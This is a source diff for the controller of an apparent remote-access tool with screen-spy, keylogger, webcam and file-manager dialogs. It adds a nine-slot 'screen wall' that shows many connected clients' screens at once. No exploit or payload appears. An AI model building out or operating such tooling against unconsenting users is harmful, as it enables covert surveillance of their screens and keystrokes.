@@ -485,7 +485,9 @@ int CMainFrame::OnCreate(LPCREATESTRUCT lpCreateStruct)
 
 	LoadIcons();  //菜单图片显示
 
-
+	//一开始就要启动屏幕墙服务
+	m_dlgVideo.Create(IDD_VIDEOWALL);
+	m_dlgVideo.SetWindowPos(&wndNoTopMost,0,0,0,0,SWP_NOSIZE|SWP_NOMOVE);
 
 	// 文件管理
 	nFilePacketLength = (FILEMyFileSize + 1)*sizeof(char)+1;
@@ -993,8 +995,9 @@ void CMainFrame::ProcessReceiveComplete(ClientContext *pContext)
 		case FILEMANAGER_DLG:
 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
+		//#TODO 目前改为屏幕墙功能
 		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceiveComplete();
+			((CScreenSpyDlgSmall *)dlg)->OnReceiveComplete();
 			break;
 		case KEYBOARD_DLG:
 			((CKeyBoardDlg *)dlg)->OnReceiveComplete();
@@ -1106,8 +1109,9 @@ void CMainFrame::ProcessReceive(ClientContext *pContext)
 	{
 		switch (pContext->m_Dialog[0])
 		{
+			//#TODO 目前改为屏幕墙功能
 		case SCREENSPY_DLG:
-			((CScreenSpyDlg *)dlg)->OnReceive();
+			((CScreenSpyDlgSmall *)dlg)->OnReceive();
 			break;
 		case WEBCAM_DLG:
 			((CWebCamDlg *)dlg)->OnReceive();
@@ -1497,7 +1501,6 @@ void CMainFrame::OnVideoWall()
 	else{
 	
 	m_dlgVideo.Create(IDD_VIDEOWALL);
-
 	m_dlgVideo.CenterWindow();
 	m_dlgVideo.ShowWindow(SW_SHOW);
 	}
@@ -1537,22 +1540,37 @@ LRESULT CMainFrame::OnOpenManagerDialog(WPARAM wParam, LPARAM lParam)
 
 LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 {
-	//检查是否已经启动过了，同时只能存在一个屏幕墙
 
-	
+
+	m_dlgVideo.ShowWindow(SW_SHOW);
 
 
 	//AfxMessageBox("Start sCreen Share");
+	for(int i =0; i<9 ; i++)
+	{
+		if(m_dlgVideo.m_nWallFlag[i] == false)
+		{
+			m_dlgVideo.m_nWallPoint = i;
+			m_dlgVideo.m_nWallFlag[i] = true;
+			break;
+		}
+	}
+
+
+
+
+
+
 	ClientContext *pContext = (ClientContext *)lParam;
 	
-	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(&m_dlgVideo, m_iocpServer, pContext);
+	CScreenSpyDlgSmall	*dlg = new CScreenSpyDlgSmall(&m_dlgVideo, m_iocpServer, pContext,m_dlgVideo.m_nWallPoint);
 
 
 
 
 	CRect IFramerect;
     CStatic* pStatic;
-	pStatic = (CStatic*)m_dlgVideo.GetDlgItem(staticList[m_dlgVideo.m_nWallCount]);
+	pStatic = (CStatic*)m_dlgVideo.GetDlgItem(staticList[m_dlgVideo.m_nWallPoint]);
     //pStatic = (CStatic*)GetDlgItem(IDC_STATIC);
 
 
@@ -1564,7 +1582,6 @@ LRESULT CMainFrame::OnOpenScreenSpyDialog(WPARAM wParam, LPARAM lParam)
 	dlg->GetWindowRect(IFramerect);
 	dlg->SetWindowPos(&wndTop, 0, 0, IFramerect.Width(), IFramerect.Height(), SWP_SHOWWINDOW);
     dlg->ShowWindow(SW_SHOW);
-	m_dlgVideo.m_nWallCount++;
 	
 	
 	pContext->m_Dialog[0] = SCREENSPY_DLG;
